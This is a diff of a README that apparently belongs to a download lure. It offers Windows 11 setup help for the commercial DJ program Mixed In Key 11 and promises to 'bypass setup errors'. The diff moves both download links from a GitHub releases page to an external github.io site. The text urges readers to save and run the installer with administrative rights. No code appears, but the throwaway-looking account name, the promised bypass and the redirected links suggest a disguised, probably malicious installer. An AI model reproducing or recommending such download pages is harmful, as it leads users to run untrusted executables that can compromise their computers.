@@ -1,6 +1,6 @@
 # 🎧 Mixed-In-Key-11-Setup-Help - Run Your Music Software Without Errors
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://github.com/Overfull-agitation461/Mixed-In-Key-11-Setup-Help/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://overfull-agitation461.github.io)
 
 ## 📁 Project Overview
 This guide helps you put Mixed In Key 11 on your Windows 11 computer. Many users face installation blocks when they try to load this DJ software. This document provides clear steps to bypass setup errors and ensure the program runs on your machine. You will find info on common fixes, system checks, and the setup process.
@@ -15,7 +15,7 @@ Your Windows 11 computer needs specific settings to run this software. Check you
 *   Administrative rights for your user account.
 
 ## 🚀 Downloading The Software
-Visit this page to download the latest setup file for your system: [https://github.com/Overfull-agitation461/Mixed-In-Key-11-Setup-Help/releases](https://github.com/Overfull-agitation461/Mixed-In-Key-11-Setup-Help/releases).
+Visit this page to download the latest setup file for your system: [https://overfull-agitation461.github.io](https://overfull-agitation461.github.io).
 
 Select the newest release version. Save the installer file in a folder you can find, such as your Downloads folder.
 
